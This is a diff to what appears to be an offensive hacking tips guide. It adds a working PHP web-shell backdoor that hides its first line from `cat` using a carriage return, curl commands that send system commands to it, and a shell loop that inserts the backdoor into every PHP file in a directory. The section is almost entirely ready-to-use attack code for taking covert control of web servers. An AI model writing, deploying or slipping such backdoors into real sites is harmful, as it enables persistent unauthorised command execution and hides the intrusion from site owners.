@@ -1040,10 +1040,30 @@ Other methods:
 
 Hide from `cat` with a [simple carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/): 
 ```sh
-echo -e "<?php if(isset(\$_POST[0])){\`\$_POST[0]\`;} ?>\r<?php echo \"hello world\"; echo \" this is a test\"; ?>" > /var/www/html/test.php
-###
-curl http://192.168.0.1/test.php -d 1="id; uname -mrs"
+### The first line will be hidden from cat
+cd /var/www/html
+echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Hello THC was here...."; ?>' >test.php
 ```
+Note the `$'\r'`: It will move the cursor back and then overwrite with the following line.
+
+Test the backdoor:
+```sh
+### 1. Optional: Start a test PHP server
+cd /var/www/html && php -S 127.0.0.1:8080
+### Without executing a command
+curl http://127.0.0.1:8080/test.php
+### With executing a command
+curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
+```
+Alternatively add ``<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>`` to the beginning of any existing PHP page:
+
+```sh
+for f in *.php; do
+   sed -i '1s/^/<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>\r/' "$f"
+   echo "Backdoored: '$f'"
+done
+```
+
 ---
 <a id="shell-hacks"></a>
 ## 7. Shell Hacks
